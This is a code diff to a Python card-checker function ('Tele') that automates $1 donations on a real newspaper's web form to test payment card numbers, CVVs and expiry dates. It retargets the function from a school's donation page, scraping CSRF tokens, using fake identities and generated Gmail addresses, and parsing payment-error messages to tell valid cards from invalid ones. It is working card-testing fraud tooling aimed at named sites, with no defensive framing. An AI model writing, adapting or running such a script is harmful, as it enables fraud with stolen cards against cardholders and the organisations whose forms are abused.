@@ -35,11 +35,11 @@ def Tele(ccx):
 	last = f'{random5}{random6}{random7}{random8}'
 	
 	cookies = {
-	    'PHPSESSID': '4142f3c37c6efb05b389d2861d',
+	    'PHPSESSID': '1d5d2630a85eaedd8e24c37da8',
 	}
 	
 	headers = {
-	    'authority': 'www.oakwoodfriends.org',
+	    'authority': 'www.triangletribune.com',
 	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'cache-control': 'max-age=0',
@@ -55,30 +55,29 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	response = session.get(
-	    'https://www.oakwoodfriends.org/forms/lighting-the-way-campaign-donation-to-oakwood-friends-school/',
-	    cookies=cookies,
-	    headers=headers,
-	)
+	params = {
+	    'submenu': 'Donate',
+	    'src': 'forms',
+	    'ref': 'Donation',
+	}
+	
+	response = session.get('https://www.triangletribune.com/index.php', params=params, cookies=cookies, headers=headers)
 	
 	hash = re.search(r'name="hash" value="(.*?)"', response.text).group(1)
 	csrf = re.search(r'name="csrfToken" value="(.*?)"', response.text).group(1)
 	
 	cookies = {
-	    'PHPSESSID': '4142f3c37c6efb05b389d2861d',
-	    '_gid': 'GA1.2.317092951.1754024640',
-	    '_ga_EQG0DHYGHS': 'GS2.1.s1754022338$o1$g1$t1754024639$j39$l0$h0',
-	    '_ga': 'GA1.1.746156273.1754024640',
+	    'PHPSESSID': '1d5d2630a85eaedd8e24c37da8',
 	}
 	
 	headers = {
-	    'authority': 'www.oakwoodfriends.org',
+	    'authority': 'www.triangletribune.com',
 	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'cache-control': 'max-age=0',
 	    'content-type': 'application/x-www-form-urlencoded',
-	    'origin': 'https://www.oakwoodfriends.org',
-	    'referer': 'https://www.oakwoodfriends.org/forms/lighting-the-way-campaign-donation-to-oakwood-friends-school/',
+	    'origin': 'https://www.triangletribune.com',
+	    'referer': 'https://www.triangletribune.com/index.php?submenu=Donate&src=forms&ref=Donation',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -91,27 +90,14 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    'formProcessed': 'Donate_Lighting-the-Way',
+	    'formProcessed': 'Donation',
 	}
 	
 	data = {
-	    'formField_donation_select': 'other',
+	    'formField_donation_amount': 'other',
 	    'formField_other_amount': '1',
-	    'formField_bill_firstname': f'{first}',
-	    'formField_bill_lastname': f'{last}',
-	    'formField_bill_address1': 'Street 27',
-	    'formField_bill_city': 'New York',
-	    'formField_bill_state': 'NY',
-	    'formField_bill_zip': '10014',
-	    'formField_Name': 'Rodam User',
-	    'formField_Affiliation': 'Other',
-	    'formField_class_year': '1',
-	    'formField_Phone': '4303000850',
-	    'formField_Email': f'genpaypal{random_amount1}{random_amount2}@gmail.com',
-	    'formField_Comments': '',
-	    'formPayment_method': 'Credit Card',
-	    'formPayment_card': f'{type}',
 	    'formPayment_owner': f'{first} {last}',
+	    'formPayment_card': f'{type}',
 	    'formPayment_number': f'{n}',
 	    'formPayment_cvv': f'{cvc}',
 	    'formMeta_formPayment_expiration': 'expiration',
@@ -119,24 +105,26 @@ def Tele(ccx):
 	        f'{mm}',
 	        f'20{yy}',
 	    ],
-	    'formPayment_gateway': '',
+	    'formField_Email': f'genpaypal{random_amount1}{random_amount2}@gmail.com',
+	    'formPayment_method': 'Credit Card',
 	    'formPayment_total_payment': '1',
-	    'formField_TotalDonationAmount': '',
+	    'formPayment_gateway': '',
 	    'hash': f'{hash}',
 	    'csrfToken': f'{csrf}',
 	    'edit_id': '0',
 	    'module': '',
 	    'src': 'forms',
 	    'srctype': 'process',
-	    'id': 'Donate_Lighting-the-Way',
-	    'fs_id': 'Donate_Lighting-the-Way',
+	    'id': 'Donation',
+	    'fs_id': 'Donation',
+	    'submenu': 'Donate',
 	}
 	
-	response = session.post('https://www.oakwoodfriends.org/index.php', params=params, cookies=cookies, headers=headers, data=data)
+	response = session.post('https://www.triangletribune.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
 	
 	try:
 		result = re.search(r'Payment error:</b> (.*?)<\/div>', response.text).group(1)
 	except:
-		result = re.search(r'&nbsp;e-mail (.*?) to <a', response.text).group(1)
+		result = re.search(r'Palatino Linotype;">(.*?)<\/span>', response.text).group(1)
 		
 	return (result)
